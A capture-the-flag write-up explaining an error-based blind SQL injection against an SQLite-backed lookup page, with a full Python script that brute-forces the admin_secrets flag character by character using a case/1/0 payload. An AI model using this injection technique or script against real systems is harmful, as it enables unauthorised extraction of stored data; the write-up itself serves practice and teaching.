# Error - SQL Injection
Super easy SQLi. 
The challenge provided the table admin_secrets and column secret_data, so all that was left was
performing an error-based SQLi injection in SQLite.

##Background
A simple querying website, the server accepts an integer value representing the index at which an
account exists. For example, inputting "1" returns "Exists: True"

The server simply returns "Exists": true if our query was a success or not, so this will be used as the
basis for our blind SQLi attack.

If you've never done a blind error-based SQLi before, they all follow this general concept:
1. Test if the first character in "secret_data" is the character "a"
2. If it is, return 1 (which is a normal query causing the server to return "Exists": true)
3. If it isn't, return 1/0 (which is a divide by zero error, causing the server to return "Exists": false)
4. Repeat until we identify the first character in "secret_data"
5. Repeat steps 1-4 brute-forcing each character until we get the flag.

I actually wrote this exact challenge for Grayhats CTF 2025 just in MySQL so it was kind of troll.
```
import requests
from urllib.parse import quote

URL = "http://web2.spokane-ctf.com:8084/error"
CHARSET = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_{}"
flag = ""
index = 1
while True:
    found = False
    print("Attempting:")
    #for each character in charset
    for c in CHARSET:
        #craft the payload 
        payload = f"1 and case when (select 1 from admin_secrets where substring(secret_data, 1, {index}) = '{flag}{c}') then 1 else 1/0 end"
        print(payload)
        data = {
            "id": payload   
        }        
        #send the payload to the server. URL encode the payload so it works
        response = requests.get("http://web2.spokane-ctf.com:8084/api/error/check?id=" + quote(payload))
        #test if the payload was a success
        if "\"exists\":true" in response.text:
            flag += c
            print("\n FLag so far: " + flag)
            found = True
            index+=1
            print("\n")
            break
    #Lazy code, but assume that we found the whole flag if we fully iterated through charset.
    if not found:
        print("Complete")
        break

print("Found: " + flag)
```
